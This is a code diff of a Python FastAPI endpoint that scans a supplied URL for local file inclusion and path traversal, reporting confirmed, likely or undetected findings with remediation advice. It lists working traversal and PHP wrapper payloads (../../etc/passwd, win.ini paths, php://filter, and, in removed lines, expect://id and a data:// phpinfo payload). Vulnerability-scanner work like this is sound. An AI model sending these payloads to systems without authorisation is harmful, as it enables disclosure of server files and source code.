@@ -1,203 +1,248 @@
-"""
-LFI / Path Traversal Scanner
-Tests for Local File Inclusion (LFI) and directory traversal vulnerabilities.
+"""LFI / Path Traversal Scanner — High-Fidelity File Disclosure Detection.
+
+Accurately classifies findings using verified file signatures:
+- Confirmed: Unix passwd, Windows win.ini, or decodeable PHP base64 filter stream contents.
+- Likely: Explicit file inclusion error disclosures (e.g. open_basedir, failed to open stream).
+- Possible: Filesystem path disclosures in error messages.
+- Not Detected: Benign length shifts without signature or error evidence.
 """
 from __future__ import annotations
-import asyncio
+import base64
 import re
-import time
-from urllib.parse import urlparse, parse_qs, urlencode
-from typing import List, Dict, Tuple, Optional, Any
-import httpx
-from fastapi import APIRouter
-from pydantic import BaseModel
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
+from typing import Any, Dict, List, Optional, Tuple
 
-router = APIRouter()
+from fastapi import APIRouter
+from pydantic import BaseModel, Field
+
+from backend.security.confidence import (
+    Confidence,
+    Severity,
+    create_finding,
+    standard_response,
+)
+from backend.security.http_client import safe_request
+from backend.security.logger import redact_secrets
+from backend.security.target_validator import TargetValidationError, validate_target_url
+from backend.tools.utils import clean_url, err, ok
+
+router = APIRouter(tags=["scanning"])
+
+# Known file signatures that verify real file disclosure
+UNIX_PASSWD_SIGS = [
+    r"root:x:0:0:[^:]*:/root:",
+    r"daemon:x:[0-9]+:[0-9]+:",
+    r"bin:x:[0-9]+:[0-9]+:",
+    r"nobody:x:[0-9]+:[0-9]+:",
+]
+
+WINDOWS_INI_SIGS = [
+    r"\[fonts\]",
+    r"\[extensions\]",
+    r"\[mci extensions\]",
+    r"\[files\]",
+]
+
+LFI_ERROR_PATTERNS = [
+    (r"open_basedir restriction in effect\. File\([^\)]+\) is not within the allowed path", "open_basedir restriction"),
+    (r"failed to open stream:\s*No such file or directory", "PHP stream open error"),
+    (r"failed to open stream:\s*Permission denied", "PHP permission denied"),
+    (r"include\([^\)]+\):\s*failed to open stream", "PHP include failure"),
+    (r"java\.io\.FileNotFoundException:", "Java file not found"),
+    (r"System\.IO\.FileNotFoundException:", ".NET file not found"),
+]
 
 TRAVERSAL_PAYLOADS = [
-    # Unix traversal
-    "../../../../etc/passwd",
-    "../../../etc/passwd",
-    "../../etc/passwd",
-    "....//....//....//etc/passwd",
-    "..%2F..%2F..%2Fetc%2Fpasswd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%252f..%252f..%252fetc%252fpasswd",
-    "/etc/passwd",
-    "/proc/self/environ",
-    "/var/log/apache2/access.log",
-    # Windows traversal
-    "..\\..\\..\\windows\\win.ini",
-    "..%5c..%5c..%5cwindows%5cwin.ini",
-    "C:\\windows\\win.ini",
-    "C:/windows/win.ini",
-    # PHP wrappers
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://input",
-    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
-    "expect://id",
-    "file:///etc/passwd",
-    # Null byte injection (older PHP)
-    "../../../../etc/passwd%00",
-    "../../etc/passwd%00.jpg",
+    # Unix passwd
+    ("../../../../etc/passwd", "Unix relative traversal"),
+    ("....//....//....//etc/passwd", "Unix nested slash bypass"),
+    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded relative traversal"),
+    ("/etc/passwd", "Unix direct path"),
+    # Windows win.ini
+    ("..\\..\\..\\windows\\win.ini", "Windows backslash traversal"),
+    ("..%5c..%5c..%5cwindows%5cwin.ini", "Windows encoded backslash"),
+    ("C:\\windows\\win.ini", "Windows direct drive path"),
+    # PHP stream filter
+    ("php://filter/convert.base64-encode/resource=index.php", "PHP base64 encode filter"),
 ]
-
-# Signatures indicating successful LFI
-UNIX_SIGS = [
-    r"root:x:0:0:",
-    r"daemon:x:",
-    r"/bin/(sh|bash)",
-    r"bin:x:\d+:",
-    r"www-data:x:",
-]
-WIN_SIGS = [
-    r"\[extensions\]",
-    r"for 16-bit app support",
-    r"\[mci extensions\]",
-]
-PHP_SIGS = [
-    r"PD9waHA",   # base64 of <?php
-    r"<\?php",
-    r"SCRIPT_NAME",
-    r"HTTP_HOST",
-]
-
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (BB-Suite LFI Scanner)",
-    "Accept": "text/html,*/*",
-}
 
 
 class LFIRequest(BaseModel):
-    target: str
-    depth: str = "medium"  # quick | medium | deep
+    target: str = Field(..., min_length=1, max_length=2048)
+    depth: str = Field("medium", max_length=64)
 
 
-def _normalize_url(url: str) -> str:
-    if not url.startswith("http"):
-        url = "https://" + url
-    return url
-
-
-def _detect_lfi(text: str) -> tuple[bool, str]:
-    for sig in UNIX_SIGS:
-        if re.search(sig, text):
-            return True, f"Unix passwd file signature: `{sig}`"
-    for sig in WIN_SIGS:
-        if re.search(sig, text, re.I):
-            return True, f"Windows ini file signature: `{sig}`"
-    for sig in PHP_SIGS:
-        if re.search(sig, text):
-            return True, f"PHP source / env leak: `{sig}`"
-    return False, ""
-
-
-async def _test_param(client: httpx.AsyncClient, url: str, param: str,
-                       payloads: list[str], findings: list, baseline_len: int):
+def inject_param(url: str, param: str, payload: str) -> str:
     parsed = urlparse(url)
-    base_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
-
-    for payload in payloads:
-        test_params = dict(base_params)
-        test_params[param] = payload
-        test_url = parsed._replace(query=urlencode(test_params)).geturl()
-        try:
-            r = await client.get(test_url, timeout=8, follow_redirects=True)
-            detected, sig = _detect_lfi(r.text)
-            if detected:
-                findings.append({
-                    "severity": "critical",
-                    "title": f"LFI Confirmed — Parameter `{param}`",
-                    "detail": (
-                        f"Path traversal payload `{payload}` caused file inclusion. "
-                        f"Signature detected: {sig}. URL: {test_url[:150]}"
-                    ),
-                    "recommendation": (
-                        "URGENT: Never use user-supplied input to construct file paths. "
-                        "Use a whitelist of allowed files. Set open_basedir in PHP. "
-                        "Apply chroot jails for web processes. Disable dangerous PHP wrappers "
-                        "(php://, expect://, data://) in php.ini."
-                    ),
-                })
-                return  # One confirmed finding per param is enough
-
-            # Detect significant response-size change (may indicate file read)
-            if abs(len(r.text) - baseline_len) > 500 and len(r.text) > baseline_len + 200:
-                findings.append({
-                    "severity": "medium",
-                    "title": f"Possible Path Traversal — Parameter `{param}` (response size anomaly)",
-                    "detail": (
-                        f"Payload `{payload}` caused a significant response size change "
-                        f"({baseline_len} → {len(r.text)} bytes). Manual verification recommended."
-                    ),
-                    "recommendation": "Review the parameter for file path usage and apply strict input validation.",
-                })
-                return
-        except Exception:
-            pass
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[param] = [payload]
+    flat = {k: v[0] for k, v in params.items()}
+    return urlunparse(parsed._replace(query=urlencode(flat)))
 
 
 @router.post("/lfi_scanner")
-async def lfi_scan(req: LFIRequest):
-    t0 = time.time()
-    target = _normalize_url(req.target.strip())
-    findings = []
+async def lfi_scanner(req: LFIRequest):
+    url = clean_url(req.target)
+    try:
+        validate_target_url(url)
+    except TargetValidationError as tve:
+        return err(f"Target validation failed: {tve}")
 
-    depth_map = {"quick": 5, "medium": 12, "deep": len(TRAVERSAL_PAYLOADS)}
-    payloads = TRAVERSAL_PAYLOADS[:depth_map.get(req.depth, 12)]
+    parsed = urlparse(url)
+    existing_params = parse_qs(parsed.query, keep_blank_values=True)
 
-    async with httpx.AsyncClient(headers=HEADERS, verify=False) as client:
-        # Get baseline
-        try:
-            base = await client.get(target, timeout=10, follow_redirects=True)
-            baseline_len = len(base.text)
-        except Exception as e:
-            return {"success": False, "error": str(e)}
+    params_to_test = list(existing_params.keys())
+    if not params_to_test:
+        params_to_test = ["file", "page", "path", "include", "doc", "view", "template", "load"]
 
-        parsed = urlparse(target)
-        params = list(parse_qs(parsed.query).keys())
+    findings: List[Dict[str, Any]] = []
+    records: List[Dict[str, Any]] = []
 
-        # Also probe common LFI params if URL has none
-        if not params:
-            params = ["file", "page", "include", "path", "dir", "doc", "folder", "root", "view", "template"]
+    # Baseline request
+    try:
+        baseline_resp = await safe_request("GET", url, timeout=8.0)
+        baseline_body = baseline_resp.text
+    except Exception as e:
+        return err(f"Failed to reach target: {e}")
 
-        tasks = [
-            _test_param(client, target, p, payloads, findings, baseline_len)
-            for p in params[:10]
-        ]
-        await asyncio.gather(*tasks, return_exceptions=True)
+    for param in params_to_test:
+        param_confirmed = False
+        for payload, desc in TRAVERSAL_PAYLOADS:
+            test_url = inject_param(url, param, payload)
 
-    # Check for PHP wrappers in base response
-    if re.search(r"php://|file://|data://|expect://", base.text):
-        findings.append({
-            "severity": "medium",
-            "title": "PHP Wrapper Reference in Page Source",
-            "detail": "Page source references PHP stream wrappers which may be exploitable for LFI.",
-            "recommendation": "Audit code using stream wrappers and disable unnecessary PHP wrappers.",
-        })
+            try:
+                resp = await safe_request("GET", test_url, timeout=7.0)
+                body = resp.text
+
+                # 1. Check Unix /etc/passwd signatures
+                for u_sig in UNIX_PASSWD_SIGS:
+                    if re.search(u_sig, body):
+                        snippet = body[:200]
+                        findings.append(create_finding(
+                            title=f"LFI Confirmed (Unix /etc/passwd): param '{param}'",
+                            severity="critical",
+                            confidence=Confidence.CONFIRMED.value,
+                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server returned /etc/passwd system credentials.",
+                            recommendation="Never concatenate user input into filesystem APIs. Validate filenames against an absolute allowlist or ID lookup table.",
+                            evidence=redact_secrets(snippet),
+                        ))
+                        records.append({
+                            "Parameter": param,
+                            "Payload": payload,
+                            "Confidence": "confirmed",
+                            "Result": "💀 CONFIRMED LFI (/etc/passwd)",
+                        })
+                        param_confirmed = True
+                        break
+                if param_confirmed:
+                    break
+
+                # 2. Check Windows win.ini signatures
+                for w_sig in WINDOWS_INI_SIGS:
+                    if re.search(w_sig, body, re.IGNORECASE):
+                        findings.append(create_finding(
+                            title=f"LFI Confirmed (Windows win.ini): param '{param}'",
+                            severity="critical",
+                            confidence=Confidence.CONFIRMED.value,
+                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server returned Windows system configuration file contents.",
+                            recommendation="Do not use raw user parameters in path construction. Enforce basename extraction and path sandboxing.",
+                            evidence=f"Matched Windows signature: {w_sig}",
+                        ))
+                        records.append({
+                            "Parameter": param,
+                            "Payload": payload,
+                            "Confidence": "confirmed",
+                            "Result": "💀 CONFIRMED LFI (win.ini)",
+                        })
+                        param_confirmed = True
+                        break
+                if param_confirmed:
+                    break
+
+                # 3. Check PHP filter base64 stream decode
+                if "php://filter" in payload and len(body) > 30:
+                    # Look for base64 strings containing <?php
+                    b64_matches = re.findall(r'[A-Za-z0-9+/=]{40,}', body)
+                    for candidate in b64_matches:
+                        try:
+                            decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
+                            if "<?php" in decoded or "namespace" in decoded or "__construct" in decoded:
+                                findings.append(create_finding(
+                                    title=f"LFI Source Code Disclosure (Confirmed): param '{param}'",
+                                    severity="critical",
+                                    confidence=Confidence.CONFIRMED.value,
+                                    detail=f"PHP base64 filter successfully extracted and decoded server-side source code via parameter '{param}'.",
+                                    recommendation="Disable php:// stream wrappers and restrict file includes.",
+                                    evidence=redact_secrets(decoded[:150]),
+                                ))
+                                records.append({
+                                    "Parameter": param,
+                                    "Payload": payload,
+                                    "Confidence": "confirmed",
+                                    "Result": "💀 CONFIRMED SOURCE LEAK",
+                                })
+                                param_confirmed = True
+                                break
+                        except Exception:
+                            pass
+                if param_confirmed:
+                    break
+
+                # 4. Check LFI Error Disclosures (Likely)
+                for err_pat, err_name in LFI_ERROR_PATTERNS:
+                    m = re.search(err_pat, body, re.IGNORECASE)
+                    if m:
+                        findings.append(create_finding(
+                            title=f"LFI File Inclusion Trace (Likely): param '{param}'",
+                            severity="high",
+                            confidence=Confidence.LIKELY.value,
+                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server revealed a file system inclusion error: {err_name}.",
+                            recommendation="Sanitize user input and prevent filesystem errors from propagating to output.",
+                            evidence=m.group(0)[:150],
+                        ))
+                        records.append({
+                            "Parameter": param,
+                            "Payload": payload,
+                            "Confidence": "likely",
+                            "Result": f"🔥 LIKELY LFI ({err_name})",
+                        })
+                        param_confirmed = True
+                        break
+                if param_confirmed:
+                    break
+
+            except Exception:
+                pass
+
+        if not param_confirmed:
+            records.append({
+                "Parameter": param,
+                "Payload": "Standard Traversal Set",
+                "Confidence": "not_detected",
+                "Result": "Filtered / Safe",
+            })
 
     if not findings:
-        findings.append({
-            "severity": "pass",
-            "title": "No LFI Vulnerabilities Detected",
-            "detail": f"Tested {len(params)} parameters with {len(payloads)} payloads at {target}.",
-            "recommendation": "Maintain strict input validation. Perform authenticated testing for deeper coverage.",
-        })
+        findings.append(create_finding(
+            title="No LFI / Path Traversal Detected",
+            severity="info",
+            confidence=Confidence.NOT_DETECTED.value,
+            detail="The tested parameters did not leak system files or inclusion error traces.",
+            recommendation="Continue enforcing path validation and file allowlists.",
+        ))
 
-    crits = sum(1 for f in findings if f["severity"] == "critical")
-    highs = sum(1 for f in findings if f["severity"] == "high")
+    confirmed_count = sum(1 for f in findings if f.get("confidence") == "confirmed")
+    likely_count = sum(1 for f in findings if f.get("confidence") == "likely")
 
-    return {
-        "success": True,
-        "data": {
-            "summary": {
-                "Target": target,
-                "Depth": req.depth,
-                "Parameters Tested": str(len(params[:10])),
-                "Payloads per Param": str(len(payloads)),
-                "Critical Findings": str(crits),
-                "Duration": f"{time.time()-t0:.1f}s",
-            },
-            "findings": findings,
+    return ok({
+        "summary": {
+            "Target": url,
+            "Parameters Tested": len(params_to_test),
+            "Confirmed LFI": confirmed_count,
+            "Likely LFI": likely_count,
+            "Status": "Vulnerable" if (confirmed_count or likely_count) else "Secure",
         },
-    }
+        "findings": findings,
+        "records": records,
+        "record_columns": ["Parameter", "Payload", "Confidence", "Result"],
+    })
